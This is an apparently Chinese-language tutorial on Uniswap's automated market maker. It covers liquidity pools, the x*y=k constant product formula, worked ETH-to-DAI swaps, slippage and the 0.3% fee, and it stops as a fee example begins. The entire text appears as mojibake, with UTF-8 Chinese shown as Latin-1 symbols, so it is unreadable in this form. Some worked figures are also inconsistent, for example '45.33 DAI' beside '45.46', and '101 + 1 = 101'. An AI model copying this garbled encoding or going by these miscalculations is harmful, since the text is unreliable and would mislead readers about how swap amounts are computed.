<p>Uniswapéƒ¨ç½²åœ¨ä»¥å¤ªåŠä¸Šï¼Œè€Œä»¥å¤ªåŠæ¯ç§’å¯ä»¥å‡ºæ¥15ç¬”å·¦å³çš„äº¤æ˜“ï¼Œè¿™å¯¹äºè®¢å•è–„äº¤æ˜“æ‰€æ¥ä¸å¯è¡Œï¼Œä¸»è¦åŸå› æ˜¯ï¼šâ€œè®¢å•è–„æ¨¡å‹ä¾èµ–ä¸€ä¸ªæˆ–å¤šä¸ªå¤–éƒ¨åšå¸‚å•†å¯¹æŸé¡¹èµ„äº§ä¸€ç›´ä¸æ–­çš„åšå¸‚ï¼Œè€Œä»¥å¤ªåŠçš„TPSè¿‡ä½ä¸æ”¯æŒåšå¸‚å•†é«˜é¢‘çš„äº¤æ˜“ï¼Œå¦‚æœç¼ºå°‘äº†åšå¸‚å•†ï¼Œé‚£ä¹ˆäº¤æ˜“æ‰€çš„æµåŠ¨æ€§ç«‹åˆ»ä¼šé™ä½ï¼Œå¯¹äºç”¨æˆ·æ¥è¯´è¿™æ ·çš„äº¤æ˜“æ‰€ä½“éªŒå¾ˆå·®ã€‚â€</p>
<p>Uniswapé‡‡ç”¨æµåŠ¨æ± åŠ æ’å®šä¹˜æ³•å…¬å¼è¿™ç§è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰æ¨¡å¼å®ç°äº†èµ„äº§çš„äº¤æ¢ï¼Œè‡ªåŠ¨åŒ–åšå¸‚å•†æ¨¡å¼æ–¹å¼ä¸éœ€è¦ä¹°å–åŒæ–¹è¿›è¡ŒæŒ‚å•ï¼Œä¹Ÿä¸è¦ä¹°å–åŒæ–¹çš„è®¢å•é‡å ï¼Œå¯ä»¥è¿›è¡Œè‡ªç”±ä¹°å–ã€‚</p>
<ul>
<li>æµåŠ¨æ± ï¼šä½¿ç”¨æµåŠ¨æ± æ¥æä¾›ä¹°å–åŒæ–¹äº¤æ˜“ï¼Œåšå¸‚å•†åªè¦æŠŠèµ„é‡‘æ”¾å…¥æµåŠ¨æ± å³å¯</li>
<li>æ’å®šä¹˜æ³•å…¬å¼ï¼šæŒ‰ç…§æµåŠ¨æ± ä¸­Tokençš„æ•°é‡ï¼Œè‡ªåŠ¨è®¡ç®—ä¹°å–ä»·æ ¼</li>
</ul>
<h3 id="æµåŠ¨æ± "><a href="#æµåŠ¨æ± " class="headerlink" title="æµåŠ¨æ± "></a><strong>æµåŠ¨æ± </strong></h3><p>æµåŠ¨æ± å°±æ˜¯é”å®šåœ¨æ™ºèƒ½åˆçº¦ä¸­æ‰€æœ‰çš„ä»£å¸ä»¥åŠèµ„é‡‘çš„æ€»ç§°ï¼ŒæµåŠ¨æ˜¯èµ„é‡‘è½¬ä¸ºä»£å¸ï¼Œæˆ–ä»£å¸è½¬ä¸ºèµ„é‡‘çš„æ„æ€ã€‚</p>
<p>ä¸€ä¸ªå®Œæ•´çš„æµåŠ¨æ± åˆ†ä¸º2ä¸ªéƒ¨ä»½ï¼Œåˆ†åˆ«è¡¨ç¤ºä¸åŒçš„è´§å¸ï¼Œæˆä¸ºä¸€ä¸ªäº¤æ˜“å¯¹ï¼Œåœ¨Uniswap V1ä¸­å°±æ˜¯ETHåŠERC20ä»£å¸ï¼Œåœ¨Uniswap V2ä¸­æ˜¯æ”¯æŒä¸åŒERC20ä»£å¸ç›´æ¥äº¤æ¢ï¼Œæ‰€ä»¥åœ¨Uniswap V2ä¸­çš„æµåŠ¨æ± å¯ä»¥å…è®¸ä¸¤è¾¹æ˜¯ä¸ç›¸åŒçš„ERC20ä»£å¸ï¼Œå…¶ä¸­ETHä¼šè‡ªåŠ¨è½¬æ¢æˆä»¥WETHä»£å¸ã€‚ä¸ºäº†ç®€åŒ–ï¼Œç›´æ¥ä»¥ETH-ERC20äº¤æ˜“å¯¹ä½œä¸ºä¾‹å­ã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒUniswapå°†æ‰€æœ‰åšå¸‚å•†çš„ETHé›†åˆåœ¨ä¸€èµ·æ”¾åœ¨æµåŠ¨æ± å·¦è¾¹ï¼Œ å°†æ‰€æœ‰ERC20é›†åˆåœ¨ä¸€èµ·æ”¾åœ¨æµåŠ¨æ± çš„å³è¾¹ã€‚å¦‚æœæœ‰ç”¨æˆ·è¦ä¹°ERC20ä»£å¸ï¼Œå°±ä»æµåŠ¨æ± çš„å³è¾¹å°†ERC20ä»£å¸è½¬ç»™ç”¨æˆ·ï¼ŒåŒæ—¶å°†ç”¨æˆ·æ”¯ä»˜çš„ETHæ·»åŠ çš„æµåŠ¨æ± çš„å·¦è¾¹ï¼Œç„¶åé‡æ–°è®¡ç®—æµåŠ¨æ± ä¸­çš„ä»·æ ¼ï¼Œç­‰å¾…ä¸‹æ¬¡äº¤æ˜“ã€‚ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233121.jpg" alt="img"></p>
<p><strong>æ’å®šä¹˜ç§¯å…¬å¼</strong></p>
<p>Uniswapç”¨æ¥ç¡®å®štokenäº¤æ˜“æ±‡ç‡çš„æ’å®šä¹˜ç§¯å…¬å¼ï¼Œæœ€åˆæ¥æºè‡ª2018å¹´3æœˆVitalik Buterinå‘è¡¨è¿‡çš„ä¸€ç¯‡æ–‡ç« ä¸­ã€‚æ­¤æ–‡ä¸­è¡¨è¿°ï¼Œæ ¹æ®ä»¥ä¸‹å…¬å¼æ¥è®¡ç®—ERC20ä»£å¸çš„äº¤æ˜“æ±‡ç‡ï¼š</p>
<p>x*y &#x3D; k</p>
<p>k è¡¨ç¤ºä¸€ä¸ªä¸å˜çš„å¸¸æ•°ï¼›x å’Œ y è¡¨ç¤ºç‰¹å®šäº¤æ˜“å¯¹ä¸­ETHå’ŒERC20ä»£å¸çš„å¯ç”¨æ•°é‡ã€‚</p>
<p>å¯¹äºUniswapè€Œè¨€ï¼Œåˆ™æ˜¯è¯¥ERC20ä»£å¸å’ŒETHçš„äº¤æ˜“åˆçº¦ä¸­ETHå’Œè¯¥ERC20ä»£å¸çš„æµåŠ¨æ€§æ± çš„å‚¨å¤‡é‡ã€‚åœ¨è¿™ä¸ªå…¬å¼ä¸­ï¼Œè¯¥ERC20ä»£å¸å’ŒETHçš„å…‘æ¢æ±‡ç‡ï¼Œå°†å§‹ç»ˆå¤„äºæ­¤å…¬å¼ç»“æœæ›²çº¿ä¸Šçš„æŸä¸€ç‚¹ã€‚</p>
<p>è¿™ä¸ªå…¬å¼æ˜¯Uniswapåè®®çš„ç»„æˆéƒ¨åˆ†ï¼ŒVitalik Buterinä½¿ç”¨ä¸‹é¢è¿™ä¸ªå›¾æ¥å¯¹å…¶è¿›è¡Œæè¿°ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233122.jpg" alt="img"></p>
<p>ä½¿ç”¨æ­¤å…¬å¼ï¼Œå¦‚æœä»¥Uniswapä¸­çš„äº¤æ˜“åˆçº¦ä¸¾ä¾‹ï¼Œåˆ™ä»£è¡¨è¯¥äº¤æ˜“åˆçº¦å‚¨å¤‡æœ‰ x æ•°é‡çš„Aä»£å¸å’Œ y æ•°é‡çš„Bä»£å¸ã€‚è¿™ä¸ªåˆçº¦å°†å§‹ç»ˆä¿æŒä¹˜ç§¯æ’å®šï¼Œä¹Ÿå°±æ˜¯è¯´ x * y å¾—åˆ°çš„ k å€¼ä¸å˜ã€‚</p>
<p>ä»»ä½•äººéƒ½å¯ä»¥é€šè¿‡æœ‰æ•ˆæ”¹å˜åšå¸‚å•†åœ¨ x* y æ›²çº¿ä¸Šçš„ä½ç½®æ¥è¿›è¡Œä¹°å…¥æˆ–è€…å–å‡ºä»£å¸ã€‚</p>
<p>æ¨ªè½´ä»£è¡¨å–å‡ºçš„Aä»£å¸çš„æ•°é‡ï¼Œçºµè½´ä»£è¡¨ä¹°å…¥çš„Bä»£å¸çš„æ•°é‡ã€‚</p>
<p>å‡è®¾Bä»£å¸æ˜¯ETHï¼Œè€ŒAä»£å¸æ˜¯ä»»æ„ä¸€ç§ERC20ä»£å¸ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ x * y &#x3D; k çš„å…¬å¼æ¥ç†è§£ä¸€ä¸‹å®ƒä»¬çš„åŠŸèƒ½ï¼š</p>
<p>å¦‚æœAliceå†³å®šä¹°å…¥å¤§é‡Aä»£å¸ï¼Œé‚£ä¹ˆå°†å¯¼è‡´Aä»£å¸çš„ç´§ç¼ºï¼Œå¹¶ä¸”å¯¼è‡´ETHæ•°é‡çš„å¢åŠ ã€‚Aliceè´­ä¹°çš„è¡Œä¸ºå¯¼è‡´äº†æŠŠæ±‡ç‡ç§»åŠ¨åˆ°äº† x * y &#x3D; k æ›²çº¿ä¸Šçš„å¦ä¸€ä¸ªç‚¹ã€‚çº¢ç‚¹å°†å‘å·¦ç§»åŠ¨ï¼Œä¹Ÿå°±æ˜¯ä¹°å…¥Aä»£å¸çš„ä»·æ ¼å˜å¾—æ›´åŠ é«˜ã€‚ä¹Ÿå¯ä»¥å°†Uniswapçš„äº¤æ˜“åˆçº¦ä¸­çš„ETHå’ŒAä»£å¸çš„ç›¸å¯¹ä¾›åº”ç†è§£ä¸ºAä»£å¸çš„ä¾›éœ€å…³ç³»ï¼Œè¿™ç§ä¾›éœ€å…³ç³»å†³å®šäº†Aä»£å¸ä¸ETHä¹‹é—´çš„æ±‡ç‡ã€‚</p>
<p>å¦‚å‰æ‰€è¿°ï¼Œç¬¬ä¸€ä¸ªä¸ºäº¤æ˜“åˆçº¦æä¾›æµåŠ¨æ€§çš„å……å€¼æ“ä½œï¼Œå¹¶ä¸å–å†³äºäº¤æ˜“æ±‡ç‡ã€‚è€Œæ˜¯åè¿‡æ¥ï¼Œåé¢çš„äº¤æ˜“æ±‡ç‡ï¼Œå°†å–å†³äºç¬¬ä¸€æ¬¡ä¸ºäº¤æ˜“åˆçº¦æä¾›æµåŠ¨æ€§çš„è¿™ä¸ªå……å€¼æ“ä½œå……å€¼äº†å¤šå°‘ETHå’ŒERC20ä»£å¸ï¼Œç”¨ç¬¬ä¸€ä¸ªæµåŠ¨æ€§æä¾›è€…è®¤ä¸ºçš„ç­‰å€¼ï¼Œæ¥åæ˜ ERC20&#x2F;ETHçš„å…‘æ¢æ±‡ç‡ã€‚å¦‚æœè¿™ä¸ªæ±‡ç‡å’Œå¸‚åœºå¯¹æ¯”è¿‡é«˜æˆ–è€…è¿‡ä½ï¼Œ<strong>å¥—åˆ©äº¤æ˜“è€…</strong>éƒ½ä¼šå¾ˆå¿«æŠŠå·®è·æŠ¹å¹³ï¼Œç›´åˆ°å¸‚åœºæ­£å¸¸æ°´å¹³ã€‚</p>
<p><strong>Uniswap ä¸Šçš„äº¤æ˜“ç±»å‹ï¼šETH â‡„ ERC20 äº¤æ˜“</strong></p>
<p>åœ¨Uniswapä¸Šå¯ä»¥è¿›è¡Œçš„äº¤æ˜“ä¸­çš„ä¸€ç§ï¼Œå°±æ˜¯ETHå’ŒERC20ä»£å¸ä¹‹é—´çš„äº¤æ˜“ã€‚å°±åƒå‰é¢æåˆ°çš„ï¼Œè¿™ä¸ªäº¤æ˜“å¯¹çš„æ±‡ç‡å–å†³äºæ­¤äº¤æ˜“åˆçº¦å†…ETHå’Œè¯¥ ERC20ä»£å¸æµåŠ¨æ€§æ± çš„ç›¸å¯¹è§„æ¨¡ã€‚è¿™ä¸ªäº¤æ˜“æ±‡ç‡æ˜¯ç”±Uniswapçš„æ’å®šä¹˜ç§¯å…¬å¼æ¥å†³å®šçš„ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH æ±  * token æ±  = æ’å®šä¹˜ç§¯å€¼</span><br></pre></td></tr></table></figure>

<p>åœ¨Uniswapä¸Šæ‰§è¡Œä»»ä½•äº¤æ˜“ï¼Œæ­¤æ’å®šä¹˜ç§¯å€¼éƒ½ä¿æŒä¸å˜ã€‚åªæœ‰å½“æ­¤äº¤æ˜“åˆçº¦ä¸­çš„æµåŠ¨æ€§æ± å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ­¤æ’å®šä¹˜ç§¯å€¼æ‰ä¼šå‘ç”Ÿå˜åŒ–ã€‚</p>
<p>æˆ‘ä»¬ç”¨ ETH â‡„ DAIï¼ˆä¸€ç§ERC20ä»£å¸ï¼‰æ¥ä¸¾ä¾‹ï¼šã€æœ¬ä¾‹ä¸­ä¸è€ƒè™‘æ‰‹ç»­è´¹ã€‘</p>
<p>Bobæƒ³è¦å‘èµ·äº¤æ˜“æ¥ç”¨è‡ªå·±çš„1ä¸ªETHå…‘æ¢æˆERC20ä»£å¸DAIï¼ŒBobå°†ä½¿ç”¨ Uniswapä¸Šå·²ç»å­˜åœ¨çš„DAIäº¤æ˜“åˆçº¦æ¥å®ç°æ­¤å…‘æ¢æ“ä½œã€‚æ­¤æ—¶ï¼ŒæµåŠ¨æ€§æä¾›è€…å·²ç»å°†ä¸€å®šé‡çš„ETHå’ŒDAIå­˜åœ¨äº†äº¤æ˜“åˆçº¦ä¸­ã€‚æˆ‘ä»¬è¿™é‡Œä¸¾ä¾‹ï¼ŒæµåŠ¨æ€§æä¾›è€…ä¸€å…±å­˜äº†10 ETHå’Œ500 DAIã€‚å› æ­¤ï¼ŒåŸºç¡€çš„æ’å®šä¹˜ç§¯å€¼ä¸ºï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH æ±  * DAI æ±  = æ’å®šä¹˜ç§¯å€¼</span><br><span class="line">ETH æ±  = 10</span><br><span class="line">DAI æ±  = 500</span><br><span class="line">æ’å®šä¹˜ç§¯å€¼ = 500 * 10 = 5000</span><br></pre></td></tr></table></figure>

<p>Bobå°†é€šè¿‡å‘äº¤æ˜“åˆçº¦çš„ETHæ± å‘é€1 ETHæ¥å¯åŠ¨è¿™ç¬”äº¤æ˜“ï¼Œè¯¥1ä¸ªETHè¢«æ·»åŠ åˆ°äº†ETHæ± ä¸­ã€‚ç„¶åï¼Œæ’å®šä¹˜ç§¯å€¼é™¤ETHæ± ä¸­æ–°çš„ETHæ•°é‡ï¼Œæ¥å¾—åˆ°DAIæ± ä¸­åº”è¯¥æœ‰çš„æ•°é‡ã€‚é‚£ä¹ˆå¤šå‡ºæ¥çš„DAIï¼Œå°±å¯ä»¥åˆ†ç»™Bobäº†ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bobå‘é€äº† 1 ETH</span><br><span class="line">ETH æ±  = 10 + 1 = 11</span><br><span class="line">DAI æ±  = 5000/11 = 454.54</span><br><span class="line">Bob å°†å…‘æ¢å¾—åˆ° : 500â€“454.54 = 45.46 DAI</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™æ¬¡äº¤æ˜“ä¸­ï¼ŒBobå…‘æ¢çš„æ±‡ç‡ä¸º 45.46 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH å…¥</span><br><span class="line">45.33 DAI å‡º</span><br><span class="line">æ±‡ç‡ = 45.46 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„è®¡ç®—è¿‡ç¨‹ï¼Œå¤§å®¶è§‰å¾—æœ‰ä»€ä¹ˆé—®é¢˜å—ï¼Ÿå¯ä»¥ç»§ç»­è®¡ç®—ä¾‹å­æ¥æ„Ÿå—ä¸‹ã€åŒæ ·ä¸è€ƒè™‘äº¤æ˜“è´¹ã€‘ï¼š</p>
<p>Bobæƒ³è¦å†æ¬¡å‘èµ·äº¤æ˜“æ¥ç”¨è‡ªå·±çš„1ä¸ªETHå…‘æ¢æˆERC20ä»£å¸DAIï¼Œå½“å‰çš„æ’å®šä¹˜ç§¯ä¾ç„¶æ˜¯5000ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH æ±  * DAI æ±  = æ’å®šä¹˜ç§¯å€¼</span><br><span class="line">ETH æ±  = 11</span><br><span class="line">DAI æ±  = 5000/11 = 454.54</span><br><span class="line">æ’å®šä¹˜ç§¯å€¼ = 11 Ã— 5000/11 = 5000</span><br></pre></td></tr></table></figure>

<p>é‡å¤ä¹‹å‰çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªETHè¢«æ·»åŠ åˆ°ETHæ± ä¸­ï¼Œä»è€ŒETHæ± ä¸­æœ‰12ä¸ªå¸ï¼Œå†æ¬¡è®¡ç®—DAIæ± ä¸­åº”è¯¥ä¿ç•™çš„DAIå¸çš„æ•°é‡ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bobå‘é€äº† 1 ETH</span><br><span class="line">ETH æ±  = 11 + 1 = 12</span><br><span class="line">DAI æ±  = 5000/12 = 416.66</span><br><span class="line">Bob å°†å…‘æ¢å¾—åˆ° : 454.54â€“416.66 = 37.88 DAI</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™æ¬¡äº¤æ˜“ä¸­ï¼ŒBobå…‘æ¢çš„æ±‡ç‡ä¸º 37.88 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH å…¥</span><br><span class="line">37.88 DAI å‡º</span><br><span class="line">æ±‡ç‡ = 37.88 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>å‘ç°äº†ä»€ä¹ˆé—®é¢˜å‘¢ï¼ŸDAIå¸çš„ä»·æ ¼ä¸Šæ¶¨äº†ã€‚åœ¨åˆšåˆ›å»ºæµåŠ¨èµ„äº§æ—¶ï¼Œå¯ä»¥è®¤ä¸ºä¸€ä¸ªETHå¯ä»¥æ¢50ä¸ªDAIï¼Œ1ä¸ªDAIç­‰äº0.02ä¸ªETHï¼Œåˆ™ç»è¿‡ç¬¬ä¸€æ¬¡å…‘æ¢ä¹‹åï¼Œ1ä¸ªDAIåˆ™ç­‰äº0.022ä¸ªä»¥å¤ªåŠï¼Œç›¸å½“äºæœ‰10%çš„ä»·æ ¼ä¸Šæ¶¨ã€‚</p>
<p>å¦‚æœç¬¬äºŒæ¬¡æœ‰äººå†è´­ä¹°1ETHï¼Œè¿™æ—¶å€™Uniswapåªè¿”å›äº†37.88ä¸ªDAIï¼Œç›¸å½“äº1 DAI&#x3D;0.0264ä¸ªETHï¼Œåˆä¸Šæ¶¨äº†20%ã€‚</p>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸ªæ–°çš„æ¦‚å¿µï¼Œæ»‘ç‚¹ã€‚æ»‘ç‚¹æ˜¯æŒ‡ç”¨æˆ·æœ€ç»ˆå®ç°å…‘æ¢çš„æ±‡ç‡åç¦»äº†çœŸå®çš„æ±‡ç‡ã€‚è­¬å¦‚ä¸Šé¢Bobç¬¬ä¸€æ¬¡ä½¿ç”¨ETHè´­å…¥DAIæ—¶ï¼Œçœ‹åˆ°æ± ä¸­çš„æ¯”ä¾‹ï¼Œè®¤ä¸ºè‡ªå·±åº”è¯¥è·å¾—50ä¸ªDAIï¼Œä½†å®é™…ä¸Šåªè·å¾—äº† 45.46ä¸ªã€‚è¿™ä¸ªæ—¶å€™ï¼Œç›¸å½“äºç”¨æˆ·æ‰¿å—äº†æŸå¤±ã€‚é‚£ä¹ˆå¦‚ä½•é™ä½æ»‘ç‚¹å‘¢ï¼Ÿå†çœ‹ä¸€ä¸ªä¾‹å­ã€‚</p>
<p>å‡è®¾Bobæƒ³è¦å‘èµ·äº¤æ˜“æ¥ç”¨è‡ªå·±çš„1ä¸ªETHå…‘æ¢æˆERC20ä»£å¸DAIï¼ŒBobå‘ç°æ­¤æ—¶ä»¥å¤ªåŠä¸Šæœ‰ä¸¤ä¸ªUniswapåˆçº¦æä¾›å…‘æ¢åŠŸèƒ½ã€‚ä¸€ä¸ªåˆçº¦çš„èµ„é‡‘æ± æ˜¯10 ETHå’Œ500 DAIï¼Œå¦ä¸€ä¸ªåˆçº¦çš„èµ„é‡‘æ± ä¸­æµåŠ¨æ€§æä¾›è€…ä¸€å…±å­˜äº†100ETHå’Œ5000 DAIã€ä¹Ÿå³æ­¤æ—¶çš„å…‘æ¢å¸ä¹Ÿæ˜¯1:50ã€‘ã€‚é‚£ä¹ˆBobåº”è¯¥é€‰å–å“ªä¸ªåˆçº¦è¿›è¡Œå…‘æ¢å‘¢ï¼Ÿä¸Šé¢æˆ‘ä»¬å·²ç»è®¨è®ºäº†æ’å®šç§¯ä¸º5000çš„ä¾‹å­ï¼Œç°åœ¨æˆ‘ä»¬è®¨è®ºä¸‹æ’å®šç§¯ä¸º500,000çš„ä¾‹å­ã€‚ç°åœ¨çš„åŸºç¡€çš„æ’å®šä¹˜ç§¯å€¼ä¸ºï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH æ±  * DAI æ±  = æ’å®šä¹˜ç§¯å€¼</span><br><span class="line">ETH æ±  = 100</span><br><span class="line">DAI æ±  = 5000</span><br><span class="line">æ’å®šä¹˜ç§¯å€¼ = 5000 * 100 = 500ï¼Œ000</span><br></pre></td></tr></table></figure>

<p>Bobå°†é€šè¿‡å‘äº¤æ˜“åˆçº¦çš„ETHæ± å‘é€1 ETHæ¥å¯åŠ¨è¿™ç¬”äº¤æ˜“ï¼Œè¯¥1ä¸ªETHè¢«æ·»åŠ åˆ°äº†ETHæ± ä¸­ã€‚ç„¶åï¼Œæ’å®šä¹˜ç§¯å€¼é™¤ETHæ± ä¸­æ–°çš„ETHæ•°é‡ï¼Œæ¥å¾—åˆ°DAIæ± ä¸­åº”è¯¥æœ‰çš„æ•°é‡ã€‚é‚£ä¹ˆå¤šå‡ºæ¥çš„DAIï¼Œå°±å¯ä»¥åˆ†ç»™Bobäº†ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bobå‘é€äº† 1 ETH</span><br><span class="line">ETH æ±  = 101 + 1 = 101</span><br><span class="line">DAI æ±  = 500ï¼Œ000/101 = 4950.50</span><br><span class="line">Bob å°†å…‘æ¢å¾—åˆ° : 5000â€“4950.50 = 49.50 DAI</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™æ¬¡äº¤æ˜“ä¸­ï¼ŒBobå…‘æ¢çš„æ±‡ç‡ä¸º 49.50 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH å…¥</span><br><span class="line">49.50 DAI å‡º</span><br><span class="line">æ±‡ç‡ = 49.50 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œä»ä¸Šé¢çš„ä¾‹å­ä¸­å¯ä»¥çœ‹å‡ºï¼Œå½“å…‘æ¢é‡‘é¢ç›¸å¯¹äºå…‘æ¢æ± èµ„é‡‘é‡è¿‡å¤§ï¼Œæˆ–è€…è¯´å¯¹äºä¸€å®šçš„å…‘æ¢é‡‘é¢ï¼Œå…‘æ¢æ± èµ„é‡‘å¤ªå°‘æ—¶ï¼Œå°±ä¼šå‡ºç°è¾ƒå¤§æ»‘ç‚¹ã€‚ä½†å½“å…‘æ¢æ± ä¸­çš„ä»£å¸æ•°é‡å……è¶³æ—¶ï¼Œæ»‘ç‚¹çš„æ•°é¢å°±ä¼šå‡å°‘ï¼Œè€Œä¸”èµ„é‡‘è¶Šå¤šï¼Œæ»‘ç‚¹è¶Šå°ã€‚æ»‘ç‚¹çš„å¤§å°å’Œå¸¸è¯´çš„äº¤æ˜“æ·±åº¦ã€<strong>äº¤æ˜“æ·±åº¦</strong>æ˜¯æŒ‡å¸‚åœºåœ¨æ‰¿å—å¤§é¢äº¤æ˜“æ—¶å¸ä»·ä¸å‡ºç°å¤§å¹…æ³¢åŠ¨çš„èƒ½åŠ›ã€‘å¤§å°ç›¸åï¼Œæ»‘ç‚¹è¶Šå°ï¼Œäº¤æ˜“æ·±åº¦è¶Šå¤§ï¼Œç”¨æˆ·è¶Šèƒ½å¤ŸæŒ‰ç…§ç¨³å®šçš„ä»·æ ¼å®Œæˆäº¤æ˜“ã€‚</p>
<p>å› æ­¤ï¼Œä¸ºäº†å¸å¼•ç”¨æˆ·ï¼ŒUniswapåˆçº¦ä¸­éœ€è¦æœ‰è¶³å¤Ÿå¤§çš„èµ„é‡‘æ± ï¼Œä½†æ˜¯Uniswapæ— æ³•è‡ªå·±å˜å‡ºé’±æ¥ï¼Œå› æ­¤éœ€è¦ä¾èµ–å¤–éƒ¨èµ„é‡‘å‘åˆçº¦ä¸­æ³¨å…¥èµ„é‡‘ï¼Œä»¥æä¾›æµåŠ¨æ€§ï¼Œå‘UniswapæµåŠ¨æ± ä¸­æä¾›æµåŠ¨æ€§çš„ç”¨æˆ·è¢«ç§°ä¸ºæµåŠ¨æ€§æä¾›è€…ã€‚ä½†æ˜¯Uniswapå¦‚ä½•å¸å¼•æµåŠ¨æ€§æä¾›è€…å‘¢ï¼Ÿ</p>
<p>å½“æµåŠ¨æ€§æä¾›è€…å‘Uniswapä¸­æ³¨å…¥æµåŠ¨æ€§çš„æ—¶å€™ï¼ŒUniswapä¼šé“¸é€ å‡ºä¸€ä¸ªæµåŠ¨æ€§ä»£å¸ï¼Œé“¸å‡ºä»£å¸æ•°é‡æ˜¯ä¸ç”¨æˆ·æ³¨å…¥çš„èµ„é‡‘æ‰€å æµåŠ¨æ± ä¸­çš„èµ„é‡‘æ¯”ä¾‹ç›¸å…³ï¼ŒæµåŠ¨æ€§æä¾›è€…å¯ä»¥é€‰æ‹©åœ¨ä»»ä½•æ—¶é—´é”€æ¯è‡ªå·±æŒæœ‰çš„æµåŠ¨æ€§ä»£å¸ã€‚ä¸ºäº†é¼“åŠ±ç”¨äºå‘Uniswapçš„æµåŠ¨æ± ä¸­æä¾›æ›´å¤šçš„æµåŠ¨æ€§ï¼ŒUniswapä¼šä»æ¯ç¬”äº¤æ˜“æ€»é¢ä¸­æŠ½å–0.3%å½“æˆäº¤æ˜“æ‰‹ç»­è´¹ï¼Œå¹¶å°†æ‰‹ç»­è´¹å…¨é¢äº¤ç»™é‚£äº›å°†æ³¨èµ„é‡‘åˆ°Uniswapèµ„é‡‘æ± æä¾›æµåŠ¨æ€§çš„æµåŠ¨æ€§æä¾›è€…ã€‚</p>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒæµåŠ¨æ€§æä¾›è€…éœ€è¦å°†ç­‰å€¼çš„ETHä»¥åŠERC20ä»£å¸å……å€¼åˆ°äº¤æ˜“åˆçº¦ä¸­ã€‚ç¬¬ä¸€ä¸ªå‘æ­¤åˆçº¦ä¸­æä¾›æµåŠ¨æ€§çš„æµåŠ¨æ€§æä¾›è€…å°±æ‹¥æœ‰è®¾ç½®æ­¤ERC20ä»£å¸ä¸ETHä¹‹é—´å…‘æ¢æ±‡ç‡çš„æƒåˆ©ã€‚ç¬¬ä¸€ä¸ªæµåŠ¨æ€§æä¾›è€…æŠŠè‡ªå·±è®¤ä¸ºç­‰ä»·å€¼çš„ETHæ•°é‡å’ŒERC20ä»£å¸æ•°é‡å……å€¼åˆ°æ­¤äº¤æ˜“åˆçº¦ï¼Œå°±å¯ä»¥å®ç°è®¾ç½®æ±‡ç‡ã€‚è€Œå¦‚æœç¬¬ä¸€ä¸ªæµåŠ¨æ€§æä¾›è€…è®¾ç½®çš„è¿™ä¸ªæ±‡ç‡å’Œå¤–é¢æ›´å¤§ç›˜çš„å¸‚åœºä¸ä¸€è‡´ï¼Œé‚£ä¹ˆå¥—åˆ©äº¤æ˜“è€…å°±ä¼šé€šè¿‡äº¤æ˜“æ¥æŠŠè¿™äº›ä»·å·®æŠ¹å¹³ï¼Œå’Œå¤§ç›˜ä¿æŒä¸€è‡´çš„æ±‡ç‡ã€‚æ­¤åæ‰€æœ‰æµåŠ¨æ€§æä¾›è€…å°†ä»¥å…¶å……å€¼æ—¶çš„æ±‡ç‡ä½œä¸ºè®¡ç®—ç­‰ä»·çš„ä¾æ®ã€‚</p>
<p>æ¥ä¸‹æ¥å†çœ‹ä¸€ä¸ªä¾‹å­ï¼Œåœ¨æœ‰äº¤æ˜“è´¹ç”¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•å½±å“ç”¨æˆ·çš„å…‘æ¢ç‡ã€‚</p>
<p>è€ƒè™‘èµ„é‡‘æ± ä¸­æœ‰10ä¸ªETHå’Œ500ä¸ªDAIçš„æƒ…å†µï¼ŒBobå°†é€šè¿‡å‘äº¤æ˜“åˆçº¦çš„ETHæ± å‘é€1ETHæ¥å¯åŠ¨äº¤æ˜“ï¼Œæ­¤æ—¶ï¼Œäº¤æ˜“é‡‘é¢çš„0.3%ä¹Ÿå°±æ˜¯0.003ETHå°†è¢«æ‰£é™¤ä½œä¸ºç»™æµåŠ¨æ€§æä¾›è€…çš„æŠ¥é…¬ã€‚å‰©ä½™çš„0.997ETHåˆ™è¢«æ·»åŠ åˆ°äº†ETHæ± é‡Œé¢ã€‚ç„¶åï¼Œæ’å®šä¹˜ç§¯å€¼é™¤ETHæ± ä¸­æ–°çš„ETHæ•°é‡ï¼Œæ¥å¾—åˆ°DAIæ± ä¸­åº”è¯¥æœ‰çš„æ•°é‡ã€‚é‚£ä¹ˆå¤šå‡ºæ¥çš„DAIï¼Œå°±å¯ä»¥åˆ†ç»™Bobäº†ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p>
